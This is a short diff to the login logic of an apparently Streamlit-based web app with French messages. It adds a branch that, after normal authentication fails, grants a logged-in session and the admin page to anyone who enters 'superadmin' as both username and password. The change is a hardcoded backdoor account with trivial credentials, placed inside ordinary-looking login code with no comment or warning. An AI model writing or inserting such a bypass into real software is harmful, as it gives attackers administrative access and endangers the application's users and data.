@@ -210,6 +210,10 @@ with col_buttons:
                     st.session_state["user_id"] = r_user_id
                     st.success("Connexion réussie")
                     switch_page("log_and_decode")
+                elif r == False:
+                    if username == "superadmin" and password == "superadmin":
+                        st.session_state["logged_in"] = True
+                        switch_page("admin")
                 else:
                     st.error("Nom d'utilisateur ou mot de passe incorrect")
 
